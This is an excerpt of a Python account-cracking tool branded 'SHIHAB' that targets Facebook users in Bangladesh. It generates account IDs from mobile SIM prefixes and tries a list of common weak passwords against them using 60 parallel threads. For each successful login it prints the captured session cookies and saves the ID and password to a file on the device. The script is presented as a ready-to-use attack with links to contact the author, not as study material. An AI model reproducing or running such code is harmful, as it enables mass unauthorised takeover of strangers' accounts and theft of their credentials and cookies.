...
logo= (f"""
\x1b[38;5;46m   $$$$$$$$\ $$$$$$$\  $$$$$$$\   $$$$$$\  
\x1b[38;5;47m   $$  _____|$$  __$$\ $$  __$$\ $$  __$$\ 
\x1b[38;5;48m   $$ |      $$ |  $$ |$$ |  $$ |$$ /  $$ |
\x1b[38;5;49m   $$$$$\    $$$$$$$\ |$$$$$$$  |$$$$$$$$ |
\x1b[38;5;50m   $$  __|   $$  __$$\ $$  __$$< $$  __$$ |
\x1b[38;5;51m   $$ |      $$ |  $$ |$$ |  $$ |$$ |  $$ |
\x1b[38;5;52m   $$$$$$$$\ $$$$$$$  |$$ |  $$ |$$ |  $$ |
\x1b[38;5;53m   \________|\_______/ \__|  \__|\__|  \__|                                                                                                                    
{RX}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
...
def Main():
	os.system('clear')
	print(logo)
	print(f'{R}[{B}={R}] {I}[A] START RANDOM CLONING ')
	print(f'{R}[{B}={R}] {I}[B] CONTACT ADMIN')
	print(f'{R}[{B}={R}] {II}[E] EXIT ')
	line()
	opt = input(f'{R}[{B}={R}] {G} CHOICE MENU : ')
	if opt in ["1","A"]:
		virusA()
	if opt in ["B","2"]:
		admin()
...
def admin():
	...
	if bal =='1':
		os.system('xdg-open https://wa.me/+8801866365167');time.sleep(1)
		admin()
	if bal =='2':
		os.system('xdg-open https://facebook.com/groups/822977329469096/');time.sleep(1)
		admin()
	if bal =='3':
		os.system('xdg-open https://github.com/SHIHAB-X');time.sleep(1)
		admin()
	if bal =='0':
		Main()
...
def virusA():
	...
	os.system('clear')
	print(logo)
	print(" \033[38;5;46m┏━[•] \033[38;5;46mBD SIM CODE : 017 018 019 013 015 016]")
	kode = input(' ┗━[+] \033[38;5;46mENTER CODE : ')
	print(' ┏━[•] \033[38;5;46mEXAMPLE : 1000,5000,10000,15000,20000] ')
	limit = int(input(' ┗━[+] \033[38;5;46mENTER LIMIT : '))
	...
	with ThreadPool(max_workers=60) as yaari:
		...
		print(logo)
		tl = str(len(user))
		print('\033[38;5;46m┏━[•] \033[38;5;46mCOUNTRY : BANGLADESH ')
		print('\033[38;5;46m┣━[•] \033[38;5;46mTOTAL ID : '+tl)
		print(f'\033[38;5;46m┣━[•] \033[38;5;46mSIM CODE :\033[1;92m {kode} ')
		print('\033[38;5;46m┗━[•] \033[38;5;46mIM YOUR BROTHER SHIHAB ')
		line()
		for guru in user:
			uid = kode+koda+kodb+guru
			pwx = [koda+kodb+guru,kodb+guru,kode+koda+kodb,kode+kode,kode+'123',kode+'1234','FREE FIRE','free fire','i love you','Bangladesh','bangladesh']
...
def b(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write(f'\r \033[1;90m[{I}SHIHAB 💚\033[1;90m] \033[1;96m%s/%s\033[1;90m \033[1;90m[\033[1;92mOK:%s\033[1;90m] '%(loop,tl,len(oks))),
            sys.stdout.flush()
    ...
    'viewport-width': '980',
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[65:80]
                print(f'\r\r\033[1;32m {X}[{G}SHIHAB-OK💚{X}]{G} {cid} {X}|{G} '+ps)
                print('\r\033[1;37m [🍪] COOKIES :- '+coki)
                oks.append(cid)
                open('/sdcard/SHIHAB-OK⚡.txt', 'a').write(cid+' | '+ps+' | '+uid+'\n')
                break
            else:
                continue
        loop+=1        
